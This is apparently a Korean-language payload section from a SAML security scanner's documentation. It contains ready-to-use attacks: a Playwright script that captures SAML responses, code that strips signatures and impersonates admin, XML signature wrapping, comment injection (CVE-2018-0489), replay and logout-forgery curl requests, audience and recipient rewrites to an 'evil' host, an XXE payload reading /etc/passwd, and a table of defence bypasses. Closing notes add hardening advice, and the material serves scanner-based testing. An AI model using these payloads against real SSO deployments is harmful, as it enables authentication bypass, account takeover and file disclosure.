### 기본 페이로드

#### SAML Response 캡처 (Playwright)
```javascript
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();
  let saml = null;
  page.on('request', r => {
    if (r.url().match(/\/(acs|saml\/callback)/) && r.postData()?.includes('SAMLResponse')) {
      saml = new URLSearchParams(r.postData()).get('SAMLResponse');
    }
  });
  await page.goto('https://target/auth/saml/login');
  console.log('Complete IdP login...');
  await page.waitForURL('**/dashboard**', { timeout: 60000 });
  if (saml) require('fs').writeFileSync('/tmp/saml.xml', Buffer.from(saml, 'base64').toString());
  await browser.close();
})();
```

**서명 제거** (`SIGN_OPTIONAL` 라벨):
```python
import base64, re
xml = open('/tmp/saml.xml').read()
xml = re.sub(r'<ds:Signature.*?</ds:Signature>', '', xml, flags=re.DOTALL)
xml = xml.replace('user@target.com', 'admin@target.com')
print(base64.b64encode(xml.encode()).decode())
```
```
POST /acs  Content-Type: application/x-www-form-urlencoded
SAMLResponse=<변조_Base64>&RelayState=/dashboard
```

**XSW (XML Signature Wrapping)** (`XSW` 라벨):
```xml
<Response>
  <Assertion ID="_evil"><!-- 변조 (서명 안 됨) -->
    <Subject><NameID>admin</NameID></Subject>
    <AttributeStatement>
      <Attribute Name="role"><AttributeValue>admin</AttributeValue></Attribute>
    </AttributeStatement>
  </Assertion>
  <Assertion ID="_original"><!-- 원본 (서명됨) -->
    <ds:Signature>...</ds:Signature>
    <Subject><NameID>user</NameID></Subject>
    ...
  </Assertion>
</Response>
```

**Comment Injection** (`COMMENT_INJECTION` 라벨, CVE-2018-0489):
```xml
<saml:NameID>admin<!-- x -->@evil.com</saml:NameID>
<!-- 일부 파서가 comment 건너뛰고 문자 병합 → "admin@evil.com" 해석 -->

<saml:NameID>admin<!--->@target.com</saml:NameID>
```

#### Replay (Assertion 재사용)
```bash
# 이전 Response 그대로 재전송 (1회용 캐시 없으면)
curl -X POST "https://target/acs" -d "SAMLResponse=<이전_Response>&RelayState=/dashboard"
```

#### Audience/Recipient/Destination 변조
```python
# 다른 SP용 Assertion 재사용
xml = xml.replace('<Audience>target.com</Audience>', '<Audience>other-sp.com</Audience>')
xml = xml.replace('Recipient="https://target/acs"', 'Recipient="https://evil/acs"')
xml = xml.replace('Destination="https://target/acs"', 'Destination="https://evil/acs"')
```

#### Issuer 변조
```xml
<saml:Issuer>https://malicious-idp.com</saml:Issuer>
<!-- iss 검증 누락 시 다른 IdP의 토큰 통과 -->
```

**Metadata MITM** (`METADATA_MITM` 라벨):
```bash
# 메타데이터 URL이 HTTP인 경우 MITM으로 IdP 키 교체
# sandbox에선 /etc/hosts 수정 또는 프록시로 시뮬레이션
```

#### SLO (Single Logout) CSRF
```bash
# LogoutRequest 서명 없이 강제 로그아웃
curl -X POST "https://target/slo" -d "SAMLRequest=<위조_LogoutRequest>"
```

#### `<ds:Transforms>` 조작
```xml
<ds:SignedInfo>
  <ds:Reference URI="">
    <ds:Transforms>
      <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
        <!-- XSLT로 서명 범위 좁히기 -->
      </ds:Transform>
    </ds:Transforms>
  </ds:Reference>
</ds:SignedInfo>
```

#### XXE 결합 (xxe-scanner 영역)
```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response>...&xxe;...</samlp:Response>
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| Response만 서명 검증 | XSW — 서명된 Response 내부에 추가 Assertion |
| Assertion만 서명 검증 | 다른 IdP에서 유효 Assertion을 자기 Response에 래핑 |
| ID-based 검증 (`URI="#id"`) | 동일 ID 여러 노드 — 파서가 첫 번째 검색, 서명은 다른 위치 |
| Comment 무시 파서 | `<NameID>admin<!--x-->@evil.com</NameID>` (CVE-2018-0489) |
| 시계 skew 60초 | Assertion 1회용 캐시 없으면 1분 내 replay |
| 메타데이터 서명 검증 | 메타데이터 fetch가 HTTP면 MITM으로 키 교체 |
| Transforms 체인 | `<ds:Transforms>`에 XSLT 추가로 서명 범위 축소 |
| iss 검증만 | aud/audience 누락 — 다른 SP용 Assertion 재사용 |
| 단일 Audience 검증 | `<Audience>` 여러 개 — 첫 번째만 검사하면 우회 |

---

### 참고사항

- XSW가 가장 흔한 SAML 취약점 — `wantAssertionsSigned`/`wantResponseSigned` 양쪽 활성화 필수
- Comment injection은 파서 구현에 따라 (ruby-saml 구버전, python-saml 일부) 취약 — CVE-2018-0489
- XXE 방어는 xxe-scanner가 단독 담당 — 본 스캐너는 SAML 특화
- 메타데이터 URL이 HTTP이면 MITM으로 IdP 키 교체 가능 — HTTPS + 서명 필수
- Assertion 1회용 캐시(`duplicate assertion ID` 방어)가 없으면 시계 skew 내 replay
- XSW는 SAML Raider (Burp extension)로 자동 생성 가능 — 8가지 변형 자동 시도
- DSA/MD5/SHA1 서명 알고리즘 잔존은 weak crypto — RSA+SHA256 이상 권장
- Encrypted Assertion 사용 환경에선 암호화 검증도 필요
- Federation 메타데이터는 중간 IdP의 인증서 체인 검증 필수
- IdP-initiated SSO without RelayState 검증은 open-redirect 게이트
- SLO Logout 서명 미적용은 CSRF로 강제 로그아웃 (DoS)
- python-saml/python3-saml `strict=true` 옵션 활성화 필수 — 옵션 미설정이 기본값
- ruby-saml은 1.12+ comment injection 패치 — 버전 확인
- SAML Token Profile (WS-Security)도 동일 — soap-scanner 결합
- HTTP-Redirect binding (URL 길이 제한 8KB) vs HTTP-POST binding (제한 없음) 처리 차이
